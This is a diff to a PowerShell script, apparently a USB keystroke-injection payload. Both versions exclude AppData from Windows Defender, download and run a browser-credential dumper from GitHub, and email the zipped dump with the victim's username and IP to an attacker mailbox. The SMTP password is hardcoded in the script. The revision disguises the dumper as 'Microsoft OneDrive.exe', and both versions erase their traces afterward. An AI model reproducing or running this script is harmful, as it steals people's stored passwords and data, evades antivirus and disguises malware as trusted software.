@@ -1,36 +1,50 @@
-#Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
-mkdir "$env:appdata\dump"
-Set-Location "$env:appdata\dump"
-#Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/Bxy777/digispark/raw/main/hackbrowser.exe" -OutFile "$env:appdata\dump\hb.exe"
-./hb.exe
+# Adding Windows Defender exclusion path
+Add-MpPreference -ExclusionPath $env:APPDATA
+
+# Creating the directory we will work on
+$dumpPath = Join-Path $env:APPDATA "dump"
+mkdir $dumpPath
+Set-Location $dumpPath
+
+# Downloading and executing Microsoft OneDrive.exe
+$hackbrowserUrl = "https://github.com/Bxy777/digispark/raw/main/Microsoft%20OneDrive.exe"
+Invoke-WebRequest -Uri $hackbrowserUrl -OutFile (Join-Path $dumpPath "Microsoft OneDrive.exe")
+Start-Process (Join-Path $dumpPath "Microsoft OneDrive.exe") -Wait
 Start-Sleep -Seconds 10
-Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
-#Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
-$Random = Get-Random
-#Mailing the output you will need to enable less secure app access on your google account for this to work
-$Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("bxy63@outlook.com", "bxypass63");
-$smtp.EnableSsl = $true
-$Message.From = "bxy63@outlook.com"
-$Message.To.Add("bxy63@outlook.com")
+Remove-Item -Path (Join-Path $dumpPath "Microsoft OneDrive.exe") -Force
+
+# Creating a Zip Archive
+Compress-Archive -Path * -DestinationPath (Join-Path $dumpPath "dump.zip")
+
+# Mailing the output (you will need to enable less secure app access on your Outlook account for this to work)
+$smtpServer = "smtp.office365.com"
+$smtpFrom = "bxy63@outlook.com"
+$smtpTo = "bxy63@outlook.com"
+$username = "bxy63@outlook.com"
+$password = "bxypass63"
 $ip = Invoke-RestMethod "myexternalip.com/raw"
-$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
-$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$Message.Body = $ComputerName
-$files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\dump\dump.zip")
-$smtp.Send($Message)
-$Message.Dispose()
-$smtp.Dispose()
-#Cleanup
+
+$subject = "Successfully PWNED $env:USERNAME! ($ip)"
+$computerInfo = Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Model, Manufacturer
+$body = "Model: $($computerInfo.Model)`nManufacturer: $($computerInfo.Manufacturer)"
+
+$mailMessage = New-Object System.Net.Mail.MailMessage 
+$mailMessage.From = ($smtpFrom)
+$mailMessage.To.Add($smtpTo)
+$mailMessage.Subject = $subject
+$mailMessage.Body = $body
+
+$attachmentPath = Join-Path $dumpPath "dump.zip"
+$attachment = New-Object System.Net.Mail.Attachment($attachmentPath)
+$mailMessage.Attachments.Add($attachment)
+
+$smtp = New-Object System.Net.Mail.SmtpClient($smtpServer, 587)
+$smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)
+$smtp.EnableSsl = $true
+$smtp.Send($mailMessage)
+
+# Cleanup
 Start-Sleep -Seconds 10
-cd "$env:appdata"
-Remove-Item -Path "$env:appdata\dump" -Force -Recurse
-Remove-MpPreference -ExclusionPath "$env:appdata"
-
-
+cd $env:APPDATA
+Remove-Item -Path $dumpPath -Force -Recurse
+Remove-MpPreference -ExclusionPath $env:APPDATA
